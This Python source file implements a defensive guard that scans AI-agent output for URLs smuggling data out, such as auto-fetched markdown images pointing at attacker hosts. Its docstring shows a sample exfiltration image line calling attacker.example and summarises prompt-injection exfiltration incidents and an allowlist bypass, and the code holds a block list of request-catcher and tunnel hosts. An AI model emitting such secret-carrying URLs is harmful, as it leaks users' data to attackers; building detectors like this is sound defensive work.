"""
Jataayu EgressChannelGuard
==========================
Detects **data-exfiltration channels** in AI-agent output before it is rendered
or sent — the class of attack that the outbound *PII/secret text* guard does not
see because the leaked data is smuggled inside a **URL**, not written in prose.

Why this exists
---------------
The dominant real-world agent-exfiltration primitive is the auto-fetched
markdown image. An injected agent is steered into emitting::

    ![x](https://attacker.example/log?d=<secret-in-query-string>)

The moment a client renders that markdown, it issues a GET to the attacker's
host with the secret in the query string — **zero user interaction**. This is the
mechanism behind:

  * EchoLeak    (M365 Copilot,  CVE-2025-32711, zero-click)
  * AgentFlayer (ChatGPT connectors, Black Hat 2025)
  * Notion AI   (image auto-fetched *before* user approval, Dec 2025)

Two lessons from those incidents shape this guard:

  1. **The channel is the threat, not the payload.** Even if the PII/credential
     scanner misses the encoded blob, a markdown *image* pointing at an untrusted
     host is itself the exfiltration vector and should be caught.
  2. **Domain allowlisting alone fails.** AgentFlayer was re-exploited after a fix
     by routing through Azure Blob Storage — a *trusted* host the CSP already
     allowed. So known cloud-blob / request-catcher hosts are treated as
     *exfil beacons* (hard block), never as "safe because well-known."

Design
------
Fast, deterministic, no LLM. Extracts every outbound URL (markdown image,
markdown link, HTML ``<img>``, bare URL), classifies each by:

  * **render mode** — an *image* auto-fetches (high risk); a *link* needs a click
    (low risk unless it carries data or points at a beacon).
  * **host trust**  — allowlisted, external, or a known exfil-beacon host.
  * **data-carrying** — does the URL smuggle data (long/encoded query string,
    base64/hex blob in path or query)? Optionally: does it contain a *known*
    secret value passed in ``context_secrets``?

Returns a standard ``ThreatResult`` so it composes with the OutboundGuard.
``sanitize()`` neutralizes offending URLs (keeps link text, drops the URL).
"""

from __future__ import annotations

import re
import math
import urllib.parse
from collections import Counter
from dataclasses import dataclass, field
from typing import Optional

from jataayu.core.threat import ThreatLevel, ThreatResult, ThreatType


# ---------------------------------------------------------------------------
# Host reputation
# ---------------------------------------------------------------------------

# Hosts (and host-suffixes) whose entire purpose is to catch out-of-band
# requests, or that are routinely abused as "trusted" exfil relays because a
# victim CSP already allows them (the AgentFlayer / EchoLeak bypass pattern).
# A URL pointing at any of these is treated as an exfil beacon regardless of
# render mode — hard block.
_EXFIL_BEACON_HOSTS: tuple[str, ...] = (
    # Request catchers / OOB interaction servers
    "webhook.site",
    "requestbin.com",
    "requestbin.net",
    "pipedream.net",
    "beeceptor.com",
    "requestcatcher.com",
    "hookbin.com",
    "postb.in",
    "interact.sh",
    "oast.fun",
    "oast.pro",
    "oast.live",
    "oast.site",
    "oast.online",
    "burpcollaborator.net",
    "canarytokens.com",
    "canarytokens.org",
    # Tunnels commonly used to receive exfil
    "ngrok.io",
    "ngrok-free.app",
    "ngrok.app",
    "trycloudflare.com",
    "loca.lt",
    "serveo.net",
    # "Trusted host" relays abused in disclosed agent exfil (route-through bypass)
    "blob.core.windows.net",  # Azure Blob — AgentFlayer bypass
    "oaiusercontent.com",  # abused as reflector in some PoCs
)

# Image/asset hosts that are generally safe render targets. Kept deliberately
# small and conservative — allowlisting is opt-in via EgressConfig, this is only
# to avoid flagging obviously-benign inline references.
_DEFAULT_ALLOWED_HOSTS: tuple[str, ...] = ()


# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------


@dataclass
class EgressConfig:
    """
    Configuration for the egress-channel guard.

    Attributes:
        allowed_domains: Hosts (or host suffixes) that agent output may freely
            image/link to without being flagged (e.g. your own CDN, docs site).
            Matching is by exact host or dotted-suffix (``cdn.example.com`` is
            covered by ``example.com``).
        flag_external_images: Flag markdown/HTML images that point at any
            non-allowlisted host, even without a data-carrying query string
            (images auto-fetch, so the bare reference is already a channel).
            Default True.
        flag_external_links: Flag *links* (click-required) to external hosts even
            when they carry no data. Default False — links in prose are normal;
            only data-carrying or beacon links are flagged when this is False.
        min_query_len: Query strings at least this long count as "data-carrying".
        min_blob_len: A base64/hex-looking run at least this long (in a path or
            query value) counts as smuggled data.
    """

    allowed_domains: list[str] = field(default_factory=lambda: list(_DEFAULT_ALLOWED_HOSTS))
    flag_external_images: bool = True
    flag_external_links: bool = False
    min_query_len: int = 24
    min_blob_len: int = 16
    # A kebab/snake-case path segment below this entropy is treated as a human-readable
    # slug (repo name, article slug), not smuggled data. See _is_human_slug -- entropy
    # alone cannot separate these, so shape is checked first and this is the safety cap.
    max_slug_entropy: float = 4.2


# ---------------------------------------------------------------------------
# URL extraction
# ---------------------------------------------------------------------------

# Markdown image:  ![alt](url "optional title")  — consumes the whole construct
_MD_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*(<[^>]+>|[^)\s]+)[^)]*\)")
# Markdown link (not preceded by '!'):  [text](url)
_MD_LINK = re.compile(r"(?<!\!)\[[^\]]*\]\(\s*(<[^>]+>|[^)\s]+)[^)]*\)")
# HTML image tag src
_HTML_IMG = re.compile(r"<img\b[^>]*?\bsrc\s*=\s*['\"]([^'\"]+)['\"]", re.IGNORECASE)
# Bare URL
_BARE_URL = re.compile(r"(?<![\(\"'=])\bhttps?://[^\s\)\]\"'<>]+")

_SCHEME_ALLOWED = ("http://", "https://")


_KEBAB_SLUG = re.compile(r"^[a-z0-9]+([-_][a-z0-9]+)+$")


def _shannon(s: str) -> float:
    """Bits of entropy per character."""
    n = len(s)
    if n <= 1:
        return 0.0
    counts = Counter(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def _is_human_slug(seg: str, max_entropy: float) -> bool:
    """Is this path segment a human-readable slug rather than smuggled data?

    The blob regex is ``[A-Za-z0-9+/=_-]{16,}``, and hyphens are in that charset, so
    ANY repo/article slug of 24+ chars fullmatches it. That made the guard flag a plain
    ``github.com/<user>/project-frontierfinance-sidecar-slm/issues/4`` as "an encoded blob
    in the URL path" and hard-block the message. Judith was structurally unable to post a
    GitHub link into a group chat; 5 group messages were silently dropped on 2026-07-10/11.

    Entropy alone CANNOT separate these -- measured on real samples:

        project-frontierfinance-sidecar-slm      H=3.84   (benign)
        gateway-watcher-and-group-guard-fixes    H=3.98   (benign)
        da39a3ee5e6b4b0d3255bfef95601890afd80709 H=3.74   (a 40-char SHA -- LOWER than the slugs)

    A threshold that clears the slugs would also clear a hex SHA. What does separate them
    cleanly is *shape*: a human slug is lowercase kebab/snake case, while base64, hex digests
    and key-like blobs are not (mixed case, or no separators at all). So we require BOTH --
    kebab/snake shape AND entropy below a ceiling, so a deliberately hyphen-chunked
    high-entropy payload (``zk3n-8qvx-7t2m-rl9p``) still trips the guard.

    This narrows a false positive; it does not open a hole. Query strings, percent-encoded
    payloads, blobs in query values, protected names and known secrets are all still checked.
    """
    if not _KEBAB_SLUG.match(seg):
        return False
    return _shannon(seg) < max_entropy


def _clean_url(raw: str) -> str:
    """Strip angle-bracket wrapping and a trailing title from a captured URL."""
    u = raw.strip()
    if u.startswith("<") and u.endswith(">"):
        u = u[1:-1]
    # markdown allows:  (url "title") — cut at the first unescaped space
    if " " in u:
        u = u.split(" ", 1)[0]
    return u.strip()


# ---------------------------------------------------------------------------
# Guard
# ---------------------------------------------------------------------------


@dataclass
class _UrlFinding:
    url: str
    host: str
    render: str  # "image" | "link" | "bare"
    reason: str
    score: float


class EgressChannelGuard:
    """
    Detects data-exfiltration channels in agent output.

    Example::

        guard = EgressChannelGuard(EgressConfig(allowed_domains=["mycdn.com"]))
        result = guard.check(agent_reply, surface="github-comment")
        if result.blocked:
            safe = guard.sanitize(agent_reply)   # URLs neutralized
    """

    def __init__(self, config: Optional[EgressConfig] = None):
        self.config = config or EgressConfig()
        self._blob = re.compile(r"[A-Za-z0-9+/=_\-]{%d,}" % self.config.min_blob_len)
        self._allowed = tuple(d.lower().lstrip(".") for d in self.config.allowed_domains)

    # -- public -----------------------------------------------------------

    def check(
        self,
        text: str,
        surface: str = "public",
        context_secrets: Optional[list[str]] = None,
    ) -> ThreatResult:
        """
        Scan outbound ``text`` for exfiltration-channel URLs.

        Args:
            text: The outbound message/comment/reply.
            surface: Target surface (affects nothing structurally here, recorded
                on the result for downstream policy).
            context_secrets: Optional known-sensitive values (secrets, PII). If
                any appears — verbatim or encoded — inside a URL, that URL is a
                confirmed exfiltration and scored at maximum.

        Returns:
            ThreatResult with EXFIL_CHANNEL threat type when channels are found.
        """
        if not text or not text.strip():
            return ThreatResult(
                threat_level=ThreatLevel.CLEAN,
                original_text=text,
                surface=surface,
                explanation="Empty input",
            )

        findings = self._scan(text, context_secrets or [])
        if not findings:
            return ThreatResult(
                threat_level=ThreatLevel.CLEAN,
                original_text=text,
                surface=surface,
                explanation="No egress-channel risks detected",
            )

        max_score = max(f.score for f in findings)
        descriptions = [f"{f.render} → {f.host or '(relative)'}: {f.reason}" for f in findings]
        level = self._score_to_level(max_score)

        return ThreatResult(
            threat_level=level,
            threat_types=[ThreatType.EXFIL_CHANNEL],
            risk_score=round(max_score, 3),
            original_text=text,
            surface=surface,
            blocked=level == ThreatLevel.BLOCKED,
            matched_patterns=descriptions,
            explanation=(
                f"Egress-channel risk in {len(findings)} URL(s): "
                + "; ".join(descriptions[:3])
                + (f" (+ {len(findings) - 3} more)" if len(findings) > 3 else "")
            ),
        )

    def sanitize(self, text: str, context_secrets: Optional[list[str]] = None) -> str:
        """Neutralize offending URLs — keep human text, drop the exfil channel."""
        offending = {f.url for f in self._scan(text, context_secrets or [])}
        if not offending:
            return text

        def _neutralize_image(m: re.Match) -> str:
            url = _clean_url(m.group(1))
            return "[external image removed]" if url in offending else m.group(0)

        def _neutralize_link(m: re.Match) -> str:
            url = _clean_url(m.group(1))
            if url not in offending:
                return m.group(0)
            # keep the bracketed link text, drop the URL
            label = m.group(0).split("]", 1)[0][1:]
            return f"{label} [link removed]"

        def _neutralize_html(m: re.Match) -> str:
            url = m.group(1).strip()
            return "[external image removed]" if url in offending else m.group(0)

        def _neutralize_bare(m: re.Match) -> str:
            return "[link removed]" if m.group(0) in offending else m.group(0)

        out = _MD_IMAGE.sub(_neutralize_image, text)
        out = _HTML_IMG.sub(_neutralize_html, out)
        out = _MD_LINK.sub(_neutralize_link, out)
        out = _BARE_URL.sub(_neutralize_bare, out)
        return out

    # -- internals --------------------------------------------------------

    def _scan(self, text: str, secrets: list[str]) -> list[_UrlFinding]:
        findings: list[_UrlFinding] = []
        seen: set[tuple[str, str]] = set()

        for render, pattern in (
            ("image", _MD_IMAGE),
            ("image", _HTML_IMG),
            ("link", _MD_LINK),
            ("bare", _BARE_URL),
        ):
            for m in pattern.finditer(text):
                url = _clean_url(m.group(1) if pattern is not _BARE_URL else m.group(0))
                key = (render, url)
                if key in seen:
                    continue
                seen.add(key)
                f = self._classify(url, render, secrets)
                if f is not None:
                    findings.append(f)
        return findings

    def _classify(self, url: str, render: str, secrets: list[str]) -> Optional[_UrlFinding]:
        if not url or url.startswith("data:") or url.startswith("#"):
            return None
        # Only http(s) is an exfil channel here; mailto/relative/etc. are ignored.
        low = url.lower()
        if not low.startswith(_SCHEME_ALLOWED):
            return None

        parsed = urllib.parse.urlparse(url)
        host = (parsed.hostname or "").lower()
        query = parsed.query or ""
        path = parsed.path or ""

        # 1) Known secret leaked in the URL — confirmed exfiltration, max score.
        if secrets and self._contains_secret(url, secrets):
            return _UrlFinding(
                url, host, render, "carries a known sensitive value in the URL", 0.97
            )

        # 2) Exfil-beacon host — request catcher / abused trusted relay.
        if self._is_beacon(host):
            return _UrlFinding(
                url,
                host,
                render,
                "points at a known exfiltration-beacon / request-catcher host",
                0.92,
            )

        allowed = self._is_allowed(host)
        data_carrying, why = self._is_data_carrying(query, path)
        code_forge_artifact = self._is_public_code_forge_artifact(host, path)

        # Public code-forge artifact links often contain 40-char commit SHAs. Those are identifiers,
        # not smuggled payloads. Keep query-string and known-secret checks strict, but do not replace
        # normal GitHub/GitLab/Bitbucket commit/blob/tree links with "[link removed]".
        if code_forge_artifact and data_carrying and not query:
            data_carrying = False
            why = ""

        # 3) Allowlisted host: only flagged if it smuggles data.
        if allowed:
            if data_carrying:
                return _UrlFinding(url, host, render, f"allowlisted host but {why}", 0.60)
            return None

        # 4) External image — auto-fetches on render → channel by construction.
        if render == "image":
            if data_carrying:
                return _UrlFinding(
                    url, host, render, f"auto-fetched image to external host with {why}", 0.85
                )
            if self.config.flag_external_images:
                return _UrlFinding(
                    url, host, render, "auto-fetched image to non-allowlisted external host", 0.55
                )
            return None

        # 5) External link / bare URL — needs a click; flag only if data-carrying,
        #    or if the config opts into flagging all external links.
        if data_carrying:
            return _UrlFinding(url, host, render, f"link to external host with {why}", 0.62)
        if render == "link" and self.config.flag_external_links:
            return _UrlFinding(url, host, render, "link to non-allowlisted external host", 0.40)
        return None

    def _is_beacon(self, host: str) -> bool:
        return any(host == b or host.endswith("." + b) for b in _EXFIL_BEACON_HOSTS)

    def _is_allowed(self, host: str) -> bool:
        if not host:
            return False
        return any(host == d or host.endswith("." + d) for d in self._allowed)

    @staticmethod
    def _is_public_code_forge_artifact(host: str, path: str) -> bool:
        """True for normal public source-control artifact URLs.

        Commit/blob/tree URLs legitimately contain SHA-like path segments. A 40-char SHA in a
        GitHub commit URL is an artifact identifier, not an exfil payload, and WhatsApp users need
        those links to survive Jataayu.
        """
        h = (host or "").lower()
        if h not in {
            "github.com",
            "www.github.com",
            "gitlab.com",
            "www.gitlab.com",
            "bitbucket.org",
            "www.bitbucket.org",
        }:
            return False
        parts = [p for p in (path or "").split("/") if p]
        if len(parts) < 3:
            return False
        return parts[2].lower() in {
            "commit",
            "commits",
            "pull",
            "issues",
            "tree",
            "blob",
            "releases",
            "compare",
        }

    def _is_data_carrying(self, query: str, path: str) -> tuple[bool, str]:
        """Heuristic: does this URL smuggle data in its query or path?"""
        if query and len(query) >= self.config.min_query_len:
            return True, f"a long query string ({len(query)} chars)"
        # base64/hex blob in a query *value*
        if query:
            for _, val in urllib.parse.parse_qsl(query):
                if self._blob.fullmatch(val) and len(val) >= self.config.min_blob_len:
                    return True, "an encoded blob in a query parameter"
        # percent-encoded payload of substance
        if query.count("%") >= 4:
            return True, "a percent-encoded payload in the query"
        # encoded blob smuggled in the path
        for seg in path.split("/"):
            if not self._blob.fullmatch(seg):
                continue
            if len(seg) < max(self.config.min_blob_len, 24):
                continue
            if _is_human_slug(seg, self.config.max_slug_entropy):
                continue
            return True, "an encoded blob in the URL path"
        return False, ""

    @staticmethod
    def _contains_secret(url: str, secrets: list[str]) -> bool:
        candidates = {url, urllib.parse.unquote(url)}
        for s in secrets:
            if not s or len(s) < 4:
                continue
            for c in candidates:
                if s in c:
                    return True
            # base64 of the secret smuggled in the URL
            import base64

            try:
                enc = base64.b64encode(s.encode()).decode().rstrip("=")
                if enc and enc in url:
                    return True
            except Exception:
                pass
        return False

    @staticmethod
    def _score_to_level(score: float) -> ThreatLevel:
        if score >= 0.90:
            return ThreatLevel.BLOCKED
        elif score >= 0.70:
            return ThreatLevel.HIGH
        elif score >= 0.45:
            return ThreatLevel.MEDIUM
        elif score >= 0.20:
            return ThreatLevel.LOW
        return ThreatLevel.CLEAN
